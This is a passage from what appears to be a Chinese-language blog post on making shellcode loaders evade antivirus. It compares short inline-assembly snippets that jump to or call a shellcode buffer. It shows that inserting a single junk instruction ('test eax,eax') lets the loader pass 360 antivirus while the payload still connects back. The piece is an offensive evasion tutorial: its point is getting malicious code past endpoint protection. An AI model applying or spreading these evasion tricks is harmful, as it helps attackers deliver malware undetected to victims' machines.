## 2.X 思路整理  

来看下如何才能将这两个payload 也做免杀：

首先思路哪里来呢？能免杀的01 payload 如下，对比起来差别不是很大，尤其是与04，无非是多了一行指令，那我们是不是可以通过“花指令” 进行免杀呢？说干就干

免杀01  

*   
*   
*   
*   
*   
*   

```
  __asm  {    mov eax, offset shellcode;    _emit 0xFF;    _emit 0xE0;  }
```

  

## 3.X 实战验证  

改造03 payload 来验证，先添加一条 ”花指令“

不免杀03

*   
*   
*   
*   
*   

```
__asm  {    lea eax, shellcode    call eax  }
```

![](../Images/80bb55db767e0896a5fb01614379c029.png)

免杀03

*   
*   
*   
*   
*   
*   

```
__asm  {    lea eax, shellcode    test eax,eax    call eax  }
```

  

拿到360 测试下，完美免杀，运行也正常上线（仅增加了一条test 指令）：  

![](../Images/2039756b78a6be7d3b938249f2b772ab.png)

  

04 payload 不再赘述，通过上述方法也可以正常免杀，经测试：
